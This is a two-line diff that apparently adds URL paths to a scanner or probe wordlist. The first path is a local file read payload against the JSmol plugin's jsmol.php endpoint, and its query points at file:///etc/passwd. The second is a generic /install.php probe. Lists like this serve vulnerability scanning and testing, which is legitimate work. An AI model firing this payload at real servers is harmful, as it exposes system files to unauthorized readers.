@@ -1,0 +1,2 @@
+/filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file:///etc/passwd
+/install.php
